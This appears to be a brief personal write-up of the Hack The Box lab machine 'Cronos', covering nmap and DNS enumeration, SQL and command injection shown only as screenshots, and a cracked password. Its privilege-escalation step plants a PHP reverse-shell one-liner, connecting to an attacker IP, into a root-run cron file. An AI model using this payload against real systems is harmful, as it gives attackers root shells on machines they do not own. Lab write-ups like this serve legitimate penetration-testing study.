# Information gathering

## system network

10.10.10.13

## Nmap Scan Result

``` bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

DNS Enum

```bash
Brute forcing with /usr/share/dnsenum/dns.txt:                                                                                                                                 
_______________________________________________                                        
                                                                                                                                                                               
admin.cronos.htb.                        604800   IN    A        10.10.10.13                                                                                                   
ns1.cronos.htb.                          604800   IN    A        10.10.10.13                                                                                                   
www.cronos.htb.                          604800   IN    A        10.10.10.13
```



Exploit

*Sql Injection*

![image-20221223141205793](D:\OSCP\hackthebox\attachments\image-20221223141205793.png)

Command Injection

![image-20221223141229294](D:\OSCP\hackthebox\attachments\image-20221223141229294.png)

#### Proof

![image-20221223142427395](D:\OSCP\hackthebox\attachments\image-20221223142427395.png)

### Lateral Movement

password decode from md5 **1327663704**



### Privilege Escalation

find an cron job which run php file as root.

![image-20221223145328710](D:\OSCP\hackthebox\attachments\image-20221223145328710.png)



Insert the payload into artisan file.

```php
$sock=fsockopen("10.10.14.8",6002);exec("/bin/sh -i <&3 >&3 2>&3");
```

get shell

![image-20221223145241451](D:\OSCP\hackthebox\attachments\image-20221223145241451.png)

#### proof

